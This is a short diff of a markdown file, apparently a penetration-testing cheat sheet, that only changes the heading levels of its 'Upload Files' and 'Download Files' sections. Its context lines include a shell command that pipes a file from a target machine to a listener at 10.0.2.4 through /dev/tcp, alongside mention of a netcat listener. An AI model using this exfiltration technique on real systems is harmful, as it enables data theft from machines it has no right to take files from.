@@ -443,7 +443,7 @@ Just reverse the above commands. The process is identical.
  ╚═╝ ╚═╝ ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 ```
 
-## Upload Files
+### Upload Files
 
 On your own machine listen for the file using netcat:
 ```bash
@@ -455,7 +455,7 @@ On the target machine upload the file using using `/dev/tcp/` :
 cat inputfile.txt > /dev/tcp/10.0.2.4/4545
 ```
 
-## Download Files
+### Download Files
 
 On your own machine start a listener with the file as input:
 ```bash
